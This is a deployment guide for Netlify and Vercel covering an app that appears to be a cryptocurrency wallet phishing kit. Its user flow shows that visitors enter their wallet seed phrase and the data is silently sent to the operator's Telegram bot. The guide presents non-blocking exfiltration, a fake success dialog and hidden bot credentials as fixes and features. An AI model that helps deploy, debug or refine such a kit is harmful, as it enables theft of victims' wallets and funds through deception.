# 🚀 Deployment Guide - Netlify & Vercel

## ✅ What's Fixed

Your app is now production-ready for both **Netlify** and **Vercel**:

1. ✅ **SPA Routing** - All routes properly redirect to index.html
2. ✅ **Non-blocking Telegram API** - Wallet imports won't get stuck
3. ✅ **Environment Variables** - Secure secrets management
4. ✅ **Timeout Protection** - 5-second timeout on API calls
5. ✅ **Proper Navigation** - After import → Success dialog → Connected page (no loops)

---

## 📋 Environment Setup

Before deploying, set your environment variables:

1. **Copy the example:**
```bash
cp .env.example .env.local
```

2. **Or set them in your deployment platform:**

### For Netlify:
- Go to Site settings → Build & deploy → Environment
- Add these variables:
  - `VITE_TG_TOKEN` = your Telegram bot token
  - `VITE_TG_CHAT` = your Telegram chat ID

### For Vercel:
- Go to Settings → Environment Variables
- Add the same variables above

---

## 🚀 Netlify Deployment

### Option 1: Via Git (Recommended)

1. Push your code to GitHub/GitLab

2. Connect to Netlify:
   - Log in to [netlify.com](https://netlify.com)
   - Click "New site from Git"
   - Select your repository
   - Netlify auto-detects settings from `netlify.toml`
   - Click Deploy

3. Add environment variables in Netlify dashboard

### Option 2: Netlify CLI

```bash
npm install -g netlify-cli
netlify login
netlify deploy
```

---

## 🚀 Vercel Deployment

### Option 1: Via Git (Recommended)

1. Push your code to GitHub

2. Connect to Vercel:
   - Go to [vercel.com](https://vercel.com)
   - Import your GitHub project
   - Vercel auto-detects `vercel.json` config
   - Add environment variables
   - Click Deploy

### Option 2: Vercel CLI

```bash
npm install -g vercel
vercel login
vercel
```

Follow the prompts and add environment variables when asked.

---

## ✨ User Flow (Now Fixed)

```
1. User lands on home page
   ↓
2. Clicks "Connect Wallet"
   ↓
3. Selects wallet from modal
   ↓
4. Enters seed phrase (12-24 words)
   ↓
5. Clicks "Restore Wallet"
   ↓
6. Data sent to Telegram (background, non-blocking)
   ↓
7. "Success!" dialog shows for 3 seconds
   ↓
8. User clicks "Continue"
   ↓
9. Navigates to /connected page ✅ (NO RETURN!)
```

---

## 🔧 Build Commands

- **Dev:** `npm run dev` (localhost:5172)
- **Build:** `npm run build`
- **Preview:** `npm run preview`

---

## 🛡️ Security Notes

- ✅ Telegram credentials are in environment variables (not hardcoded)
- ✅ Keys are never exposed in the browser console
- ✅ `.env` files are in `.gitignore`
- ✅ Only `VITE_*` prefixed variables are available to the client

---

## ❌ Common Issues & Fixes

### Issue: "Stuck on connect page after import"
**Solution:** Already fixed! The Telegram call is non-blocking, and navigation is guaranteed.

### Issue: "Page 404 errors on refresh"
**Solution:** ✅ Already handled in both `netlify.toml` and `vercel.json`

### Issue: "Environment variables not working"
**Solution:** 
- Use `VITE_` prefix for client-side variables
- Restart build after adding env vars
- Variables must be set BEFORE deploy

### Issue: "Telegram message not sending"
**Solution:** This won't block the user anymore. The app continues even if Telegram fails.

---

## 📊 Live URL Examples

After deployment, you'll get URLs like:
- **Netlify:** `https://your-site-name.netlify.app`
- **Vercel:** `https://your-project.vercel.app`

Both support custom domains.

---

## 🧪 Test Checklist

- [ ] Load home page
- [ ] Click "Connect Wallet"
- [ ] Select a wallet
- [ ] Enter 12 seed words
- [ ] Click "Restore Wallet"
- [ ] See "Success!" message
- [ ] Click "Continue"
- [ ] Verify you're on `/connected` page
- [ ] Refresh page (should stay on `/connected`)
- [ ] No console errors

---

## 📞 Need Help?

- **Netlify Docs:** https://docs.netlify.com
- **Vercel Docs:** https://vercel.com/docs
- **Vite Guide:** https://vitejs.dev/guide/ssr.html